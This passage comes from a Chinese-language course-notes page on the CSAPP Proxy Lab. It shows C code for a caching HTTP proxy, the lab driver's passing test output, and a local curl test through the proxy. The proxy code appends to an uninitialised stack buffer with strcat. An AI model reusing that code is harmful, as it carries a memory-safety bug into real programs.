</span><span id=__span-195-35><a id=__codelineno-195-35 name=__codelineno-195-35></a><span class=w>        </span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>read_cnt</span><span class=o>--</span><span class=p>;</span>
</span><span id=__span-195-36><a id=__codelineno-195-36 name=__codelineno-195-36></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>read_cnt</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-195-37><a id=__codelineno-195-37 name=__codelineno-195-37></a><span class=w>            </span><span class=n>V</span><span class=p>(</span><span class=o>&amp;</span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>w</span><span class=p>);</span>
</span><span id=__span-195-38><a id=__codelineno-195-38 name=__codelineno-195-38></a><span class=w>        </span><span class=n>V</span><span class=p>(</span><span class=o>&amp;</span><span class=n>cache</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>mutex</span><span class=p>);</span>
</span><span id=__span-195-39><a id=__codelineno-195-39 name=__codelineno-195-39></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-195-40><a id=__codelineno-195-40 name=__codelineno-195-40></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-195-41><a id=__codelineno-195-41 name=__codelineno-195-41></a>
</span><span id=__span-195-42><a id=__codelineno-195-42 name=__codelineno-195-42></a><span class=w>    </span><span class=c1>//解析uri</span>
</span><span id=__span-195-43><a id=__codelineno-195-43 name=__codelineno-195-43></a><span class=w>    </span><span class=n>parse_uri</span><span class=p>(</span><span class=n>uri</span><span class=p>,</span><span class=w> </span><span class=n>uri_data</span><span class=p>);</span>
</span><span id=__span-195-44><a id=__codelineno-195-44 name=__codelineno-195-44></a>
</span><span id=__span-195-45><a id=__codelineno-195-45 name=__codelineno-195-45></a><span class=w>    </span><span class=c1>//设置header</span>
</span><span id=__span-195-46><a id=__codelineno-195-46 name=__codelineno-195-46></a><span class=w>    </span><span class=n>build_header</span><span class=p>(</span><span class=n>server</span><span class=p>,</span><span class=w> </span><span class=n>uri_data</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>rio</span><span class=p>);</span>
</span><span id=__span-195-47><a id=__codelineno-195-47 name=__codelineno-195-47></a>
</span><span id=__span-195-48><a id=__codelineno-195-48 name=__codelineno-195-48></a><span class=w>    </span><span class=c1>//连接服务器</span>
</span><span id=__span-195-49><a id=__codelineno-195-49 name=__codelineno-195-49></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>serverfd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Open_clientfd</span><span class=p>(</span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>host</span><span class=p>,</span><span class=w> </span><span class=n>uri_data</span><span class=o>-&gt;</span><span class=n>port</span><span class=p>);</span>
</span><span id=__span-195-50><a id=__codelineno-195-50 name=__codelineno-195-50></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>serverfd</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-195-51><a id=__codelineno-195-51 name=__codelineno-195-51></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-195-52><a id=__codelineno-195-52 name=__codelineno-195-52></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"connection failed</span><span class=se>\n</span><span class=s>"</span><span class=p>);</span>
</span><span id=__span-195-53><a id=__codelineno-195-53 name=__codelineno-195-53></a><span class=w>        </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-195-54><a id=__codelineno-195-54 name=__codelineno-195-54></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-195-55><a id=__codelineno-195-55 name=__codelineno-195-55></a>
</span><span id=__span-195-56><a id=__codelineno-195-56 name=__codelineno-195-56></a><span class=w>    </span><span class=n>Rio_readinitb</span><span class=p>(</span><span class=o>&amp;</span><span class=n>server_rio</span><span class=p>,</span><span class=w> </span><span class=n>serverfd</span><span class=p>);</span>
</span><span id=__span-195-57><a id=__codelineno-195-57 name=__codelineno-195-57></a><span class=w>    </span><span class=n>Rio_writen</span><span class=p>(</span><span class=n>serverfd</span><span class=p>,</span><span class=w> </span><span class=n>server</span><span class=p>,</span><span class=w> </span><span class=n>strlen</span><span class=p>(</span><span class=n>server</span><span class=p>));</span>
</span><span id=__span-195-58><a id=__codelineno-195-58 name=__codelineno-195-58></a>
</span><span id=__span-195-59><a id=__codelineno-195-59 name=__codelineno-195-59></a><span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=n>cache_buf</span><span class=p>[</span><span class=n>MAX_OBJECT_SIZE</span><span class=p>];</span>
</span><span id=__span-195-60><a id=__codelineno-195-60 name=__codelineno-195-60></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>size_buf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-195-61><a id=__codelineno-195-61 name=__codelineno-195-61></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>n</span><span class=p>;</span>
</span><span id=__span-195-62><a id=__codelineno-195-62 name=__codelineno-195-62></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>n</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Rio_readlineb</span><span class=p>(</span><span class=o>&amp;</span><span class=n>server_rio</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>MAXLINE</span><span class=p>))</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
</span><span id=__span-195-63><a id=__codelineno-195-63 name=__codelineno-195-63></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-195-64><a id=__codelineno-195-64 name=__codelineno-195-64></a><span class=w>        </span><span class=c1>//注意判断是否会超出缓存大小</span>
</span><span id=__span-195-65><a id=__codelineno-195-65 name=__codelineno-195-65></a><span class=w>        </span><span class=n>size_buf</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>n</span><span class=p>;</span>
</span><span id=__span-195-66><a id=__codelineno-195-66 name=__codelineno-195-66></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size_buf</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>MAX_OBJECT_SIZE</span><span class=p>)</span>
</span><span id=__span-195-67><a id=__codelineno-195-67 name=__codelineno-195-67></a><span class=w>            </span><span class=n>strcat</span><span class=p>(</span><span class=n>cache_buf</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>);</span>
</span><span id=__span-195-68><a id=__codelineno-195-68 name=__codelineno-195-68></a><span class=w>        </span><span class=n>printf</span><span class=p>(</span><span class=s>"proxy received %d bytes,then send</span><span class=se>\n</span><span class=s>"</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>n</span><span class=p>);</span>
</span><span id=__span-195-69><a id=__codelineno-195-69 name=__codelineno-195-69></a><span class=w>        </span><span class=n>Rio_writen</span><span class=p>(</span><span class=n>connfd</span><span class=p>,</span><span class=w> </span><span class=n>buf</span><span class=p>,</span><span class=w> </span><span class=n>n</span><span class=p>);</span>
</span><span id=__span-195-70><a id=__codelineno-195-70 name=__codelineno-195-70></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-195-71><a id=__codelineno-195-71 name=__codelineno-195-71></a><span class=w>    </span><span class=n>Close</span><span class=p>(</span><span class=n>serverfd</span><span class=p>);</span>
</span><span id=__span-195-72><a id=__codelineno-195-72 name=__codelineno-195-72></a>
</span><span id=__span-195-73><a id=__codelineno-195-73 name=__codelineno-195-73></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size_buf</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>MAX_OBJECT_SIZE</span><span class=p>)</span>
</span><span id=__span-195-74><a id=__codelineno-195-74 name=__codelineno-195-74></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-195-75><a id=__codelineno-195-75 name=__codelineno-195-75></a><span class=w>        </span><span class=n>write_Cache</span><span class=p>(</span><span class=n>cache_tag</span><span class=p>,</span><span class=w> </span><span class=n>cache_buf</span><span class=p>);</span>
</span><span id=__span-195-76><a id=__codelineno-195-76 name=__codelineno-195-76></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-195-77><a id=__codelineno-195-77 name=__codelineno-195-77></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>要注意，每次读写缓存时，都要加相应的锁。Cache 以及 LRU 具体实现的代码，这里就不再讲解了。</p> <h4 id=_37>测试与结果<a class=headerlink href=#_37 title="Permanent link">¶</a></h4> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-196-1> 1</a></span>
<span class=normal><a href=#__codelineno-196-2> 2</a></span>
<span class=normal><a href=#__codelineno-196-3> 3</a></span>
<span class=normal><a href=#__codelineno-196-4> 4</a></span>
<span class=normal><a href=#__codelineno-196-5> 5</a></span>
<span class=normal><a href=#__codelineno-196-6> 6</a></span>
<span class=normal><a href=#__codelineno-196-7> 7</a></span>
<span class=normal><a href=#__codelineno-196-8> 8</a></span>
<span class=normal><a href=#__codelineno-196-9> 9</a></span>
<span class=normal><a href=#__codelineno-196-10>10</a></span>
<span class=normal><a href=#__codelineno-196-11>11</a></span>
<span class=normal><a href=#__codelineno-196-12>12</a></span>
<span class=normal><a href=#__codelineno-196-13>13</a></span>
<span class=normal><a href=#__codelineno-196-14>14</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-196-1><a id=__codelineno-196-1 name=__codelineno-196-1></a><span class=m>09</span>-Proxy-Lab$<span class=w> </span>make<span class=w> </span>clean<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./driver.sh
</span><span id=__span-196-2><a id=__codelineno-196-2 name=__codelineno-196-2></a>***<span class=w> </span>Cache<span class=w> </span>***
</span><span id=__span-196-3><a id=__codelineno-196-3 name=__codelineno-196-3></a>Starting<span class=w> </span>tiny<span class=w> </span>on<span class=w> </span>port<span class=w> </span><span class=m>2494</span>
</span><span id=__span-196-4><a id=__codelineno-196-4 name=__codelineno-196-4></a>Starting<span class=w> </span>proxy<span class=w> </span>on<span class=w> </span>port<span class=w> </span><span class=m>17349</span>
</span><span id=__span-196-5><a id=__codelineno-196-5 name=__codelineno-196-5></a>Fetching<span class=w> </span>./tiny/tiny.c<span class=w> </span>into<span class=w> </span>./.proxy<span class=w> </span>using<span class=w> </span>the<span class=w> </span>proxy
</span><span id=__span-196-6><a id=__codelineno-196-6 name=__codelineno-196-6></a>Fetching<span class=w> </span>./tiny/home.html<span class=w> </span>into<span class=w> </span>./.proxy<span class=w> </span>using<span class=w> </span>the<span class=w> </span>proxy
</span><span id=__span-196-7><a id=__codelineno-196-7 name=__codelineno-196-7></a>Fetching<span class=w> </span>./tiny/csapp.c<span class=w> </span>into<span class=w> </span>./.proxy<span class=w> </span>using<span class=w> </span>the<span class=w> </span>proxy
</span><span id=__span-196-8><a id=__codelineno-196-8 name=__codelineno-196-8></a>Killing<span class=w> </span>tiny
</span><span id=__span-196-9><a id=__codelineno-196-9 name=__codelineno-196-9></a>Fetching<span class=w> </span>a<span class=w> </span>cached<span class=w> </span>copy<span class=w> </span>of<span class=w> </span>./tiny/home.html<span class=w> </span>into<span class=w> </span>./.noproxy
</span><span id=__span-196-10><a id=__codelineno-196-10 name=__codelineno-196-10></a>Success:<span class=w> </span>Was<span class=w> </span>able<span class=w> </span>to<span class=w> </span>fetch<span class=w> </span>tiny/home.html<span class=w> </span>from<span class=w> </span>the<span class=w> </span>cache.
</span><span id=__span-196-11><a id=__codelineno-196-11 name=__codelineno-196-11></a>Killing<span class=w> </span>proxy
</span><span id=__span-196-12><a id=__codelineno-196-12 name=__codelineno-196-12></a>cacheScore:<span class=w> </span><span class=m>15</span>/15
</span><span id=__span-196-13><a id=__codelineno-196-13 name=__codelineno-196-13></a>
</span><span id=__span-196-14><a id=__codelineno-196-14 name=__codelineno-196-14></a>totalScore:<span class=w> </span><span class=m>70</span>/70
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=chrome>Chrome 实战测试<a class=headerlink href=#chrome title="Permanent link">¶</a></h3> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-197-1> 1</a></span>
<span class=normal><a href=#__codelineno-197-2> 2</a></span>
<span class=normal><a href=#__codelineno-197-3> 3</a></span>
<span class=normal><a href=#__codelineno-197-4> 4</a></span>
<span class=normal><a href=#__codelineno-197-5> 5</a></span>
<span class=normal><a href=#__codelineno-197-6> 6</a></span>
<span class=normal><a href=#__codelineno-197-7> 7</a></span>
<span class=normal><a href=#__codelineno-197-8> 8</a></span>
<span class=normal><a href=#__codelineno-197-9> 9</a></span>
<span class=normal><a href=#__codelineno-197-10>10</a></span>
<span class=normal><a href=#__codelineno-197-11>11</a></span>
<span class=normal><a href=#__codelineno-197-12>12</a></span>
<span class=normal><a href=#__codelineno-197-13>13</a></span>
<span class=normal><a href=#__codelineno-197-14>14</a></span>
<span class=normal><a href=#__codelineno-197-15>15</a></span>
<span class=normal><a href=#__codelineno-197-16>16</a></span>
<span class=normal><a href=#__codelineno-197-17>17</a></span>
<span class=normal><a href=#__codelineno-197-18>18</a></span>
<span class=normal><a href=#__codelineno-197-19>19</a></span>
<span class=normal><a href=#__codelineno-197-20>20</a></span>
<span class=normal><a href=#__codelineno-197-21>21</a></span>
<span class=normal><a href=#__codelineno-197-22>22</a></span>
<span class=normal><a href=#__codelineno-197-23>23</a></span>
<span class=normal><a href=#__codelineno-197-24>24</a></span>
<span class=normal><a href=#__codelineno-197-25>25</a></span>
<span class=normal><a href=#__codelineno-197-26>26</a></span>
<span class=normal><a href=#__codelineno-197-27>27</a></span>
<span class=normal><a href=#__codelineno-197-28>28</a></span>
<span class=normal><a href=#__codelineno-197-29>29</a></span>
<span class=normal><a href=#__codelineno-197-30>30</a></span>
<span class=normal><a href=#__codelineno-197-31>31</a></span>
<span class=normal><a href=#__codelineno-197-32>32</a></span>
<span class=normal><a href=#__codelineno-197-33>33</a></span>
<span class=normal><a href=#__codelineno-197-34>34</a></span>
<span class=normal><a href=#__codelineno-197-35>35</a></span>
<span class=normal><a href=#__codelineno-197-36>36</a></span>
<span class=normal><a href=#__codelineno-197-37>37</a></span>
<span class=normal><a href=#__codelineno-197-38>38</a></span>
<span class=normal><a href=#__codelineno-197-39>39</a></span>
<span class=normal><a href=#__codelineno-197-40>40</a></span>
<span class=normal><a href=#__codelineno-197-41>41</a></span>
<span class=normal><a href=#__codelineno-197-42>42</a></span>
<span class=normal><a href=#__codelineno-197-43>43</a></span>
<span class=normal><a href=#__codelineno-197-44>44</a></span>
<span class=normal><a href=#__codelineno-197-45>45</a></span>
<span class=normal><a href=#__codelineno-197-46>46</a></span>
<span class=normal><a href=#__codelineno-197-47>47</a></span>
<span class=normal><a href=#__codelineno-197-48>48</a></span>
<span class=normal><a href=#__codelineno-197-49>49</a></span>
<span class=normal><a href=#__codelineno-197-50>50</a></span>
<span class=normal><a href=#__codelineno-197-51>51</a></span>
<span class=normal><a href=#__codelineno-197-52>52</a></span>
<span class=normal><a href=#__codelineno-197-53>53</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-197-1><a id=__codelineno-197-1 name=__codelineno-197-1></a><span class=c1># 编译并运行代理服务器，监听 15213 端口</span>
</span><span id=__span-197-2><a id=__codelineno-197-2 name=__codelineno-197-2></a><span class=m>09</span>-Proxy-Lab$<span class=w> </span>make<span class=w> </span>clean<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./proxy<span class=w> </span><span class=m>15213</span><span class=w> </span><span class=p>&amp;</span>
</span><span id=__span-197-3><a id=__codelineno-197-3 name=__codelineno-197-3></a><span class=c1># 编译并运行内容服务器，设置端口为 15214</span>
</span><span id=__span-197-4><a id=__codelineno-197-4 name=__codelineno-197-4></a><span class=m>09</span>-Proxy-Lab$<span class=w> </span><span class=nb>cd</span><span class=w> </span>./tiny<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>make<span class=w> </span>clean<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./tiny<span class=w> </span><span class=m>15214</span><span class=w> </span><span class=p>&amp;</span><span class=w> </span><span class=nb>cd</span><span class=w> </span>..
</span><span id=__span-197-5><a id=__codelineno-197-5 name=__codelineno-197-5></a><span class=c1># 测试，代理服务器 localhost:15213，目标服务器 localhost:15214</span>
</span><span id=__span-197-6><a id=__codelineno-197-6 name=__codelineno-197-6></a>CSAPP-Lab$<span class=w> </span>curl<span class=w> </span>-v<span class=w> </span>--proxy<span class=w> </span>http://localhost:15213<span class=w> </span>http://localhost:15214/
</span><span id=__span-197-7><a id=__codelineno-197-7 name=__codelineno-197-7></a>*<span class=w> </span>Host<span class=w> </span>localhost:15213<span class=w> </span>was<span class=w> </span>resolved.
</span><span id=__span-197-8><a id=__codelineno-197-8 name=__codelineno-197-8></a>*<span class=w> </span>IPv6:<span class=w> </span>::1
</span><span id=__span-197-9><a id=__codelineno-197-9 name=__codelineno-197-9></a>*<span class=w> </span>IPv4:<span class=w> </span><span class=m>127</span>.0.0.1
</span><span id=__span-197-10><a id=__codelineno-197-10 name=__codelineno-197-10></a>*<span class=w>   </span>Trying<span class=w> </span><span class=o>[</span>::1<span class=o>]</span>:15213...
</span><span id=__span-197-11><a id=__codelineno-197-11 name=__codelineno-197-11></a>*<span class=w> </span>connect<span class=w> </span>to<span class=w> </span>::1<span class=w> </span>port<span class=w> </span><span class=m>15213</span><span class=w> </span>from<span class=w> </span>::1<span class=w> </span>port<span class=w> </span><span class=m>59870</span><span class=w> </span>failed:<span class=w> </span>Connection<span class=w> </span>refused
</span><span id=__span-197-12><a id=__codelineno-197-12 name=__codelineno-197-12></a>*<span class=w>   </span>Trying<span class=w> </span><span class=m>127</span>.0.0.1:15213...
</span><span id=__span-197-13><a id=__codelineno-197-13 name=__codelineno-197-13></a>*<span class=w> </span>Connected<span class=w> </span>to<span class=w> </span>localhost<span class=w> </span><span class=o>(</span><span class=m>127</span>.0.0.1<span class=o>)</span><span class=w> </span>port<span class=w> </span><span class=m>15213</span>
</span><span id=__span-197-14><a id=__codelineno-197-14 name=__codelineno-197-14></a>&gt;<span class=w> </span>GET<span class=w> </span>http://localhost:15214/<span class=w> </span>HTTP/1.1
</span><span id=__span-197-15><a id=__codelineno-197-15 name=__codelineno-197-15></a>&gt;<span class=w> </span>Host:<span class=w> </span>localhost:15214
</span><span id=__span-197-16><a id=__codelineno-197-16 name=__codelineno-197-16></a>&gt;<span class=w> </span>User-Agent:<span class=w> </span>curl/8.5.0
</span><span id=__span-197-17><a id=__codelineno-197-17 name=__codelineno-197-17></a>&gt;<span class=w> </span>Accept:<span class=w> </span>*/*
</span><span id=__span-197-18><a id=__codelineno-197-18 name=__codelineno-197-18></a>&gt;<span class=w> </span>Proxy-Connection:<span class=w> </span>Keep-Alive
</span><span id=__span-197-19><a id=__codelineno-197-19 name=__codelineno-197-19></a>&gt;<span class=w> </span>
</span><span id=__span-197-20><a id=__codelineno-197-20 name=__codelineno-197-20></a>Accepted<span class=w> </span>connection<span class=w> </span>from<span class=w> </span><span class=o>(</span>localhost,<span class=w> </span><span class=m>40218</span><span class=o>)</span>
</span><span id=__span-197-21><a id=__codelineno-197-21 name=__codelineno-197-21></a>Accepted<span class=w> </span>connection<span class=w> </span>from<span class=w> </span><span class=o>(</span>localhost<span class=w> </span><span class=m>59258</span><span class=o>)</span>.
</span><span id=__span-197-22><a id=__codelineno-197-22 name=__codelineno-197-22></a>GET<span class=w> </span>/<span class=w> </span>HTTP/1.0
</span><span id=__span-197-23><a id=__codelineno-197-23 name=__codelineno-197-23></a>Host:<span class=w> </span>localhost:15214
</span><span id=__span-197-24><a id=__codelineno-197-24 name=__codelineno-197-24></a>Connection:<span class=w> </span>close
</span><span id=__span-197-25><a id=__codelineno-197-25 name=__codelineno-197-25></a>Proxy-Connection:<span class=w> </span>close
</span><span id=__span-197-26><a id=__codelineno-197-26 name=__codelineno-197-26></a>User-Agent:<span class=w> </span>Mozilla/5.0<span class=w> </span><span class=o>(</span>X11<span class=p>;</span><span class=w> </span>Linux<span class=w> </span>x86_64<span class=p>;</span><span class=w> </span>rv:10.0.3<span class=o>)</span><span class=w> </span>Gecko/20120305<span class=w> </span>Firefox/10.0.3
</span><span id=__span-197-27><a id=__codelineno-197-27 name=__codelineno-197-27></a>
</span><span id=__span-197-28><a id=__codelineno-197-28 name=__codelineno-197-28></a>proxy<span class=w> </span>received<span class=w> </span><span class=m>17</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-29><a id=__codelineno-197-29 name=__codelineno-197-29></a>proxy<span class=w> </span>received<span class=w> </span><span class=m>25</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-30><a id=__codelineno-197-30 name=__codelineno-197-30></a>*<span class=w> </span>proxy<span class=w> </span>received<span class=w> </span><span class=m>21</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-31><a id=__codelineno-197-31 name=__codelineno-197-31></a>HTTP<span class=w> </span><span class=m>1</span>.0,<span class=w> </span>assume<span class=w> </span>close<span class=w> </span>after<span class=w> </span>body
</span><span id=__span-197-32><a id=__codelineno-197-32 name=__codelineno-197-32></a>&lt;<span class=w> </span>HTTP/1.0<span class=w> </span><span class=m>200</span><span class=w> </span>OK
</span><span id=__span-197-33><a id=__codelineno-197-33 name=__codelineno-197-33></a>proxy<span class=w> </span>received<span class=w> </span><span class=m>25</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-34><a id=__codelineno-197-34 name=__codelineno-197-34></a>&lt;<span class=w> </span>Server:<span class=w> </span>Tiny<span class=w> </span>Web<span class=w> </span>Server
</span><span id=__span-197-35><a id=__codelineno-197-35 name=__codelineno-197-35></a>&lt;<span class=w> </span>Content-length:<span class=w> </span><span class=m>120</span>
</span><span id=__span-197-36><a id=__codelineno-197-36 name=__codelineno-197-36></a>proxy<span class=w> </span>received<span class=w> </span><span class=m>2</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-37><a id=__codelineno-197-37 name=__codelineno-197-37></a>&lt;<span class=w> </span>Content-type:<span class=w> </span>text/html
</span><span id=__span-197-38><a id=__codelineno-197-38 name=__codelineno-197-38></a>&lt;<span class=w> </span>
</span><span id=__span-197-39><a id=__codelineno-197-39 name=__codelineno-197-39></a>proxy<span class=w> </span>received<span class=w> </span><span class=m>7</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-40><a id=__codelineno-197-40 name=__codelineno-197-40></a>proxy<span class=w> </span>received<span class=w> </span><span class=m>33</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-41><a id=__codelineno-197-41 name=__codelineno-197-41></a>proxy<span class=w> </span>received<span class=w> </span><span class=m>8</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-42><a id=__codelineno-197-42 name=__codelineno-197-42></a>proxy<span class=w> </span>received<span class=w> </span><span class=m>40</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-43><a id=__codelineno-197-43 name=__codelineno-197-43></a>proxy<span class=w> </span>received<span class=w> </span><span class=m>16</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-44><a id=__codelineno-197-44 name=__codelineno-197-44></a>proxy<span class=w> </span>received<span class=w> </span><span class=m>8</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-45><a id=__codelineno-197-45 name=__codelineno-197-45></a>proxy<span class=w> </span>received<span class=w> </span><span class=m>8</span><span class=w> </span>bytes,then<span class=w> </span>send
</span><span id=__span-197-46><a id=__codelineno-197-46 name=__codelineno-197-46></a>&lt;html&gt;
</span><span id=__span-197-47><a id=__codelineno-197-47 name=__codelineno-197-47></a>&lt;head&gt;&lt;title&gt;test&lt;/title&gt;&lt;/head&gt;
</span><span id=__span-197-48><a id=__codelineno-197-48 name=__codelineno-197-48></a>&lt;body&gt;<span class=w> </span>
</span><span id=__span-197-49><a id=__codelineno-197-49 name=__codelineno-197-49></a>&lt;img<span class=w> </span><span class=nv>align</span><span class=o>=</span><span class=s2>"middle"</span><span class=w> </span><span class=nv>src</span><span class=o>=</span><span class=s2>"godzilla.gif"</span>&gt;
</span><span id=__span-197-50><a id=__codelineno-197-50 name=__codelineno-197-50></a>Dave<span class=w> </span>O<span class=err>'</span>Hallaron
</span><span id=__span-197-51><a id=__codelineno-197-51 name=__codelineno-197-51></a>&lt;/body&gt;
</span><span id=__span-197-52><a id=__codelineno-197-52 name=__codelineno-197-52></a>&lt;/html&gt;
</span><span id=__span-197-53><a id=__codelineno-197-53 name=__codelineno-197-53></a>*<span class=w> </span>Closing<span class=w> </span>connection
</span></code></pre></div></td></tr></table></div> </li> </ol></div> <aside class=md-source-file> <span class=md-source-file__fact> <span class=md-icon title=最后更新> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2025年11月23日 18:40:59</span> </span> <span class=md-source-file__fact> <span class=md-icon title=创建日期> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2025年11月23日 18:40:59</span> </span> </aside> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> <button type=button class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg> 回到页面顶部 </button> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; lingyu CC-BY-4.0 </div> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["navigation.tabs", "navigation.top", "navigation.indexes", "navigation.expand", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script> <script src=../../assets/javascripts/bundle.88dd0f4e.min.js></script> <script src=../../mkdocs/javascripts/katex.js></script> <script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.js></script> <script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/contrib/auto-render.min.js></script> <script src=../../javascripts/config.js></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script> </body> </html>